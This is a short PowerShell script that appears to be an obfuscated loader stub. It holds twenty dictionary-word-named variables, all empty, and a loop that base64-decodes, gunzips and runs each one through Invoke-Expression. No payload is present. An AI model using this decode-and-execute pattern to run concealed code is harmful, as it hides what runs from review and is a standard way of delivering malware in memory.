#Requires -Version 2

$Telemeters = ""
$Reenforced = ""
$Birthrates = ""
$Frequenter = ""
$Compatible = ""
$Monologues = ""
$Unmannerly = ""
$Inspecting = ""
$Extremists = ""
$Retracting = ""
$Insertions = ""
$Insinuates = ""
$Breakables = ""
$Whitehorse = ""
$Initialize = ""
$Stationing = ""
$Zoologists = ""
$Pantagruel = ""
$Derivation = ""
$Intellects = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Telemeters,$Reenforced,$Birthrates,$Frequenter,$Compatible,$Monologues,$Unmannerly,$Inspecting,$Extremists,$Retracting,$Insertions,$Insinuates,$Breakables,$Whitehorse,$Initialize,$Stationing,$Zoologists,$Pantagruel,$Derivation,$Intellects)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
